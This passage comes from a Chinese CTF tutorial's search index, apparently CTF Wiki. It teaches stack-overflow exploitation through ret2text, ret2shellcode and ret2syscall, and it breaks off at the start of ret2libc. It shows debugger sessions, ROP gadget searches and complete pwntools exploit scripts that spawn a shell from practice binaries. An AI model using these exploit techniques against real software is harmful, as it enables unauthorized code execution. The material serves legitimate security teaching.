            "text": "\u5176\u5b9e\uff0c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u539f\u7406\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u7b80\u5355\u7684\u653b\u51fb\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\uff0cbamboofox\u4e2d\u4ecb\u7ecdROP\u65f6\u4f7f\u7528\u7684ret2text\u7684\u4f8b\u5b50\u3002  \u70b9\u51fb\u4e0b\u8f7d:  ret2text  \u9996\u5148\uff0c\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236  \u279c  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u662f32\u4f4d\u7a0b\u5e8f\uff0c\u5176\u4ec5\u4ec5\u5f00\u542f\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528IDA\u6765\u67e5\u770b\u6e90\u4ee3\u7801\u3002  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( _bss_start ,   0 ,   1 ,   0 ); \n   puts ( There is something amazing here, do you know anything? ); \n   gets (( char   * ) v4 ); \n   printf ( Maybe I will tell you next time ! ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5728\u4e3b\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86gets\u51fd\u6570\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6b64\u540e\u53c8\u53d1\u73b0  .text: 080485 FD   secure            proc   near  .text: 080485 FD  .text: 080485 FD   input             =   dword   ptr   - 10 h  .text: 080485 FD   secretcode        =   dword   ptr   - 0 Ch  .text: 080485 FD  .text: 080485 FD                   push      ebp  .text: 080485 FE                   mov       ebp ,   esp  .text: 08048600                   sub       esp ,   28 h  .text: 08048603                   mov       dword   ptr   [ esp ],   0   ; timer  .text : 0804860 A                   call      _time  .text: 0804860 F                   mov       [ esp ],   eax        ; seed  .text : 08048612                   call      _srand  .text: 08048617                   call      _rand  .text: 0804861 C                   mov       [ ebp + secretcode ],   eax  .text: 0804861 F                   lea       eax ,   [ ebp + input ]  .text: 08048622                   mov       [ esp + 4 ],   eax  .text: 08048626                   mov       dword   ptr   [ esp ],   offset   unk_8048760  .text: 0804862 D                   call      ___isoc99_scanf  .text: 08048632                   mov       eax ,   [ ebp + input ]  .text: 08048635                   cmp       eax ,   [ ebp + secretcode ]  .text: 08048638                   jnz       short   locret_8048646  .text: 0804863 A                   mov       dword   ptr   [ esp ],   offset   command   ;  /bin/sh  .text : 08048641                   call      _system   \u5728secure\u51fd\u6570\u53c8\u53d1\u73b0\u4e86\u5b58\u5728\u8c03\u7528system(\"/bin/sh\")\u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u81f30x0804863A\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u7cfb\u7edf\u7684shell\u4e86\u3002  \u4e0b\u9762\u5c31\u662f\u6211\u4eec\u5982\u4f55\u6784\u9020payload\u4e86\uff0c\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5185\u5b58\u5730\u5740\u8ddd\u79bbmain\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5b57\u8282\u6570\u3002  .text: 080486 A7                   lea       eax ,   [ esp + 1 Ch ]  .text: 080486 AB                   mov       [ esp ],   eax        ; s  .text : 080486 AE                   call      _gets   \u53ef\u4ee5\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u662f\u901a\u8fc7\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u5c06\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u67e5\u770besp\uff0cebp\uff0c\u5982\u4e0b  gef\u27a4  b *0x080486AE\nBreakpoint  1  at 0x80486ae: file ret2text.c, line  24 .\ngef\u27a4  r\nThere is something amazing here,  do  you know anything?\n\nBreakpoint  1 , 0x080486ae in main  ()  at ret2text.c:24 24       gets ( buf ) ; \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  registers  ] \u2500\u2500\u2500\u2500 $eax    : 0xffffcd5c  \u2192  0x08048329  \u2192   __libc_start_main  $ebx    : 0x00000000 $ecx    : 0xffffffff $edx    : 0xf7faf870  \u2192  0x00000000 $esp    : 0xffffcd40  \u2192  0xffffcd5c  \u2192  0x08048329  \u2192   __libc_start_main  $ebp    : 0xffffcdc8  \u2192  0x00000000 $esi    : 0xf7fae000  \u2192  0x001b1db0 $edi    : 0xf7fae000  \u2192  0x001b1db0 $eip    : 0x080486ae  \u2192   main+102  call 0x8048460  gets@plt   \u53ef\u4ee5\u770b\u5230esp\u4e3a0xffffcd40\uff0cebp\u4e3a\u5177\u4f53\u7684payload\u5982\u4e0b0xffffcdc8\uff0c\u540c\u65f6s\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\u4e3a[esp+0x1c]\uff0c\u6240\u4ee5\uff0cs\u7684\u5730\u5740\u4e3a0xffffcd5c\uff0c\u6240\u4ee5s\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a0x6C\uff0c\u6240\u4ee5\u76f8\u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u4e3a0x6c+4\u3002  \u6700\u540e\u7684payload\u5982\u4e0b\uff1a  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2text )  target   =   0x804863a  sh . sendline ( A   *   ( 0x6c + 4 )   +   p32 ( target ))  sh . interactive ()", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_3", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2shellcode", 
            "text": "", 
            "title": "ret2shellcode"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_4", 
            "text": "ret2shellcode\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\u4ee3\u7801\u3002\u800c\u6240\u8c13\u7684shellcode\u6307\u7684\u662f\u7528\u4e8e\u5b8c\u6210\u67d0\u4e2a\u529f\u80fd\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u529f\u80fd\u4e3b\u8981\u662f\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684shell\u3002 \u4e00\u822c\u6765\u8bf4\uff0cshellcode\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u586b\u5145\u3002\u8fd9\u5176\u5b9e\u662f\u53e6\u5916\u4e00\u79cd\u5178\u578b\u7684\u5229\u7528\u7684\u65b9\u6cd5\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u586b\u5145\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u4ee3\u7801 \u3002  \u800c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u4e00\u822c\u90fd\u662f\u5411\u6808\u4e2d\u5199\u5185\u5bb9\uff0c\u6240\u4ee5\u8981\u60f3\u6267\u884cshellcode\uff0c\u9700\u8981\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_5", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2shellcode\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2shellcode  \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4  \u279c  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE  ( 0x8048000 ) \n    RWX:      Has RWX segments  \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u51e0\u4e4e\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5e76\u4e14\u6709\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u6bb5\u3002\u6211\u4eec\u518d\u4f7f\u7528IDA\u770b\u4e00\u4e0b\u7a0b\u5e8f  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( stdin ,   0 ,   1 ,   0 ); \n   puts ( No system for you this time !!! ); \n   gets (( char   * ) v4 ); \n   strncpy ( buf2 ,   ( const   char   * ) v4 ,   0x64u ); \n   printf ( bye bye ~ ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ecd\u7136\u662f\u57fa\u672c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fd8\u540c\u65f6\u5c06\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230buf2\u5904\u3002\u7b80\u5355\u67e5\u770b\u53ef\u77e5buf2\u5728bss\u6bb5\u3002  .bss: 0804 A080                   public   buf2  .bss: 0804 A080   ; char buf2[100]   \u8fd9\u65f6\uff0c\u6211\u4eec\u7b80\u5355\u7684\u8c03\u8bd5\u4e0b\u7a0b\u5e8f\uff0c\u770b\u770b\u8fd9\u4e00\u4e2abss\u6bb5\u662f\u5426\u53ef\u6267\u884c\u3002  gef\u27a4  b main\nBreakpoint  1  at 0x8048536: file ret2shellcode.c, line  8 .\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \n\nBreakpoint  1 , main  ()  at ret2shellcode.c:8 8        setvbuf ( stdout, 0LL,  2 , 0LL ) ; \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  source:ret2shellcode.c+8  ] \u2500\u2500\u2500\u2500\n       6   int main ( void ) \n       7    { \n \u2192     8       setvbuf ( stdout, 0LL,  2 , 0LL ) ; \n       9       setvbuf ( stdin, 0LL,  1 , 0LL ) ; \n      10   \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0x8048536 \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx \n0xf7fd3000 0xf7fd5000 0x00000000 rwx \n0xf7fd5000 0xf7fd7000 0x00000000 r--  [ vvar ] \n0xf7fd7000 0xf7fd9000 0x00000000 r-x  [ vdso ] \n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx \n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx  [ stack ]   \u901a\u8fc7vmmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230bss\u6bb5\u5bf9\u5e94\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650  0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode  \u90a3\u4e48\u8fd9\u6b21\u6211\u4eec\u5c31\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\uff0c\u4e5f\u5c31\u662f\u8bfb\u5165shellcode\uff0c\u7136\u540e\u63a7\u5236\u7a0b\u5e8f\u6267\u884cbss\u6bb5\u5904\u7684shellcode\u3002\u5176\u4e2d\uff0c\u76f8\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u7c7b\u4f3c\u4e8eret2text\u4e2d\u7684\u4f8b\u5b50\u3002  \u5177\u4f53\u7684payload\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2shellcode )  shellcode   =   asm ( shellcraft . sh ())  buf2_addr   =   0x804a080  sh . sendline ( shellcode . ljust ( 112 ,   A )   +   p32 ( buf2_addr ))  sh . interactive ()", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_6", 
            "text": "sniperoj-pwn100-shellcode-x86-64", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2syscall", 
            "text": "", 
            "title": "ret2syscall"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_7", 
            "text": "ret2syscall\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u83b7\u53d6shell\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_8", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2syscall\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2syscall  \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4  \u279c  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u63a5\u4e0b\u6765\u5229\u7528IDA\u6765\u67e5\u770b\u6e90\u7801  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( stdin ,   0 ,   1 ,   0 ); \n   puts ( This time, no system() and NO SHELLCODE!!! ); \n   puts ( What do you plan to do? ); \n   gets ( v4 ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u51fa\u6b64\u6b21\u4ecd\u7136\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u3002\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97v4\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a108\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8ev4\u7684\u504f\u79fb\u4e3a112\u3002\u6b64\u6b21\uff0c\u7531\u4e8e\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u6bb5\u4ee3\u7801\u6216\u8005\u81ea\u5df1\u586b\u5199\u4ee3\u7801\u6765\u83b7\u5f97shell\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684gadgets\u6765\u83b7\u5f97shell\uff0c\u800c\u5bf9\u5e94\u7684shell\u83b7\u53d6\u5219\u662f\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u7684\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003   https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8   \u7b80\u5355\u5730\u8bf4\uff0c\u53ea\u8981\u6211\u4eec\u628a\u5bf9\u5e94\u83b7\u53d6shell\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u653e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884cint 0x80\u5c31\u53ef\u6267\u884c\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6shell  execve ( /bin/sh , NULL , NULL )   \u5176\u4e2d\uff0c\u8be5\u7a0b\u5e8f\u662f32\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u5f97   \u7cfb\u7edf\u8c03\u7528\u53f7\u5373eax\u5e94\u8be5\u4e3a0xb  \u7b2c\u4e00\u4e2a\u53c2\u6570\u5373ebx\u5e94\u8be5\u6307\u5411/bin/sh\u7684\u5730\u5740\uff0c\u5176\u5b9e\u6267\u884csh\u7684\u5730\u5740\u4e5f\u53ef\u4ee5  \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5373ecx\u5e94\u8be5\u4e3a0  \u7b2c\u4e09\u4e2a\u53c2\u6570edx\u5e94\u8be5\u4e3a0   \u800c\u6211\u4eec\u5982\u4f55\u63a7\u5236\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c \u5462\uff1f\u8fd9\u91cc\u5c31\u9700\u8981\u4f7f\u7528gadgets\u3002\u6bd4\u5982\u8bf4\uff0c\u73b0\u5728\u6808\u9876\u662f10\uff0c\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u6267\u884c\u4e86pop eax\uff0c\u90a3\u4e48\u73b0\u5728eax\u7684\u503c\u5c31\u4e3a10\u3002\u4f46\u662f\u6211\u4eec\u5e76\u4e0d\u80fd\u671f\u5f85\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u4ee3\u7801\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u4e00\u6bb5\u63a7\u5236\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728gadgets\u6700\u540e\u4f7f\u7528ret\u6765\u518d\u6b21\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u539f\u56e0\u3002\u5177\u4f53\u5bfb\u627egadgets\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ropgadgets\u8fd9\u4e2a\u5de5\u5177\u3002  \u9996\u5148\uff0c\u6211\u4eec\u6765\u5bfb\u627e\u63a7\u5236eax\u7684gadgets  \u279c  ret2syscall ROPgadget --binary rop  --only  pop|ret   |  grep  eax \n0x0809ddda : pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x080bb196 : pop eax  ;  ret\n0x0807217a : pop eax  ;  ret 0x80e\n0x0804f704 : pop eax  ;  ret  3 \n0x0809ddd9 : pop es  ;  pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret  \u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u8ff0\u51e0\u4e2a\u90fd\u53ef\u4ee5\u63a7\u5236eax\uff0c\u90a3\u6211\u5c31\u9009\u53d6\u7b2c\u4e8c\u4e2a\u6765\u4f5c\u4e3a\u6211\u7684gadgets\u3002  \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u63a7\u5236\u5176\u5b83\u5bc4\u5b58\u5668\u7684gadgets  \u279c  ret2syscall ROPgadget --binary rop  --only  pop|ret   |  grep  ebx \n0x0809dde2 : pop ds  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0809ddda : pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0805b6ed : pop ebp  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0809e1d4 : pop ebx  ;  pop ebp  ;  pop esi  ;  pop edi  ;  ret\n0x080be23f : pop ebx  ;  pop edi  ;  ret\n0x0806eb69 : pop ebx  ;  pop edx  ;  ret\n0x08092258 : pop ebx  ;  pop esi  ;  pop ebp  ;  ret\n0x0804838b : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret\n0x080a9a42 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret 0x10\n0x08096a26 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret 0x14\n0x08070d73 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret 0xc\n0x0805ae81 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret  4 \n0x08049bfd : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret  8 \n0x08048913 : pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x08049a19 : pop ebx  ;  pop esi  ;  pop edi  ;  ret  4 \n0x08049a94 : pop ebx  ;  pop esi  ;  ret\n0x080481c9 : pop ebx  ;  ret\n0x080d7d3c : pop ebx  ;  ret 0x6f9\n0x08099c87 : pop ebx  ;  ret  8 \n0x0806eb91 : pop ecx  ;  pop ebx  ;  ret\n0x0806336b : pop edi  ;  pop esi  ;  pop ebx  ;  ret\n0x0806eb90 : pop edx  ;  pop ecx  ;  pop ebx  ;  ret\n0x0809ddd9 : pop es  ;  pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0806eb68 : pop esi  ;  pop ebx  ;  pop edx  ;  ret\n0x0805c820 : pop esi  ;  pop ebx  ;  ret\n0x08050256 : pop esp  ;  pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret\n0x0807b6ed : pop ss  ;  pop ebx  ;  ret  \u8fd9\u91cc\uff0c\u6211\u9009\u62e9  0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret  \u8fd9\u4e2a\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u5176\u5b83\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002  \u6b64\u5916\uff0c\u6211\u4eec\u9700\u8981\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002  \u279c  ret2syscall ROPgadget --binary rop  --string  /bin/sh  \nStrings  information  ============================================================ \n0x080be408 : /bin/sh  \u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u6b64\u5916\uff0c\u8fd8\u6709int 0x80\u7684\u5730\u5740\uff0c\u5982\u4e0b  \u279c  ret2syscall ROPgadget --binary rop  --only  int                  \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\n\nUnique gadgets found: 4  \u540c\u65f6\uff0c\u4e5f\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002  \u4e0b\u9762\u5c31\u662f\u5bf9\u5e94\u7684payload,\u5176\u4e2d0xb\u4e3aexecve\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u3002  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./rop )  pop_eax_ret   =   0x080bb196  pop_edx_ecx_ebx_ret   =   0x0806eb90  int_0x80   =   0x08049421  binsh   =   0x80be408  payload   =   flat ( \n     [ A   *   112 ,   pop_eax_ret ,   0xb ,   pop_edx_ecx_ebx_ret ,   0 ,   0 ,   binsh ,   int_0x80 ])  sh . sendline ( payload )  sh . interactive ()", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_9", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2libc", 
            "text": "", 
            "title": "ret2libc"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_10", 
            "text": "ret2libc\u5373\u63a7\u5236\u51fd\u6570\u7684\u6267\u884c libc\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u5e38\u662f\u8fd4\u56de\u81f3\u67d0\u4e2a\u51fd\u6570\u7684plt\u5904\u6216\u8005\u51fd\u6570\u7684\u5177\u4f53\u4f4d\u7f6e(\u5373\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9)\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u6267\u884csystem(\"/bin/sh\")\uff0c\u6545\u800c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_11", 
            "text": "\u6211\u4eec\u7531\u7b80\u5355\u5230\u96be\u5206\u522b\u7ed9\u51fa\u4e09\u4e2a\u4f8b\u5b50\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#1", 
